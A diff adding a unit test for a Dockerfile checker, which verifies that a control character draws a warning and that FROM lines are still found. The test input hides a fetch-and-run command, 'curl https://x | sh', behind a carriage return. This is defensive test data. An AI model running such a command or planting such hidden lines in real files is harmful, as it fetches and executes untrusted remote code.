@@ -395,6 +395,14 @@ class FromTest(unittest.TestCase):
         self.assertIn("build argument", found[1].message)
         self.assertTrue(all(f.severity == Severity.WARN for f in found))
 
+    def test_no_canonical_form(self) -> None:
+        """A Dockerfile it can't follow is warned about, and its `FROM` lines still found (VER-1)."""
+        text = "FROM debian:bookworm\nRUN echo ok\r# ; curl https://x | sh\nFROM alpine@sha256:abc\n"
+        found = checks.from_findings("env/Dockerfile", text, [])
+        self.assertIn("control character", found[0].message)
+        self.assertEqual([f.message.split("`")[1] for f in found[1:]], ["FROM debian:bookworm"])
+        self.assertTrue(all(f.severity == Severity.WARN for f in found))
+
 
 class BadFileTest(_Project):
     """Test a universal configuration file that isn't what the generator writes."""
